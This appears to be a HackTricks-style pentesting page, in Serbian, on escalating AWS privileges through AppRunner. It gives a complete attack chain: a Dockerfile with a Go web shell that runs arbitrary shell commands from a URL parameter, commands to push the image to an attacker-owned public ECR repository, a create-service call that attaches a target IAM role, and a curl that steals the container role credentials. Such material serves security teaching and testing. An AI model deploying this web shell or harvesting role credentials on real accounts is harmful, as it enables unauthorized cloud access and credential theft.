# AWS - AppRunner Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## AppRunner

### `iam:PassRole`, `apprunner:CreateService`

Napadač sa ovim dozvolama može kreirati AppRunner service sa pridruženom IAM roli, potencijalno eskalirajući privilegije pristupom akreditivima te role.

Napadač prvo kreira Dockerfile koji služi kao web shell za izvršavanje proizvoljnih komandi na AppRunner containeru.
```Dockerfile
FROM golang:1.24-bookworm
WORKDIR /app
RUN apt-get update && apt-get install -y ca-certificates curl
RUN cat <<'EOF' > main.go
package main

import (
"fmt"
"net/http"
"os/exec"
)

func main() {
http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
command := exec.Command("sh", "-c", r.URL.Query().Get("cmd"))
output, err := command.CombinedOutput()
if err != nil {
fmt.Fprint(w, err.Error(), output)
return
}

fmt.Fprint(w, string(output))
})
http.ListenAndServe("0.0.0.0:3000", nil)
}
EOF
RUN go mod init test && go build -o main .
EXPOSE 3000
CMD ["./main"]
```
Zatim otpremite ovu image u ECR repository.
Otpremanjem slike u javni repository u AWS nalogu kojim upravlja napadač, privilege escalation je moguć čak i ako nalog žrtve nema dozvole za upravljanje ECR-om.
```sh
IMAGE_NAME=public.ecr.aws/<alias>/<namespace>/<repo-name>:latest
docker buildx build --platform linux/amd64 -t $IMAGE_NAME .
aws ecr-public get-login-password | docker login --username AWS --password-stdin public.ecr.aws
docker push $IMAGE_NAME
docker logout public.ecr.aws
```
Zatim napadač kreira AppRunner service konfigurisan ovim web shell image-om i sa IAM Role koju želi da iskoristi.
```bash
aws apprunner create-service \
--service-name malicious-service \
--source-configuration '{
"ImageRepository": {
"ImageIdentifier": "public.ecr.aws/<alias>/<namespace>/<repo-name>:latest",
"ImageRepositoryType": "ECR_PUBLIC",
"ImageConfiguration": { "Port": "3000" }
}
}' \
--instance-configuration '{"InstanceRoleArn": "arn:aws:iam::123456789012:role/AppRunnerRole"}' \
--query Service.ServiceUrl
```
Nakon što se kreiranje servisa završi, koristite web shell da preuzmete container credentials i dobijete dozvole IAM Role pridružene AppRunner-u.
```sh
curl 'https://<service-url>/?cmd=curl+http%3A%2F%2F169.254.170.2%24AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'
```
**Potencijalni uticaj:** Direktna eskalacija privilegija na bilo koju IAM ulogu koja se može prikačiti na AppRunner servise.

{{#include ../../../../banners/hacktricks-training.md}}
